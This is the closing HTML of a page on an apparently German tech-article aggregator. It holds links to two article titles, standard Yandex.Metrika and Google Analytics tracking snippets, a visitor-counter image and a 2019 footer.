<li><a href="../de458778/index.html">Satellite 6.5 Reporting Engine: Was und warum</a></li>
<li><a href="../de458782/index.html">Anpassung von Programmen für ZX Spectrum an TR-DOS mit modernen Mitteln. Teil 3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>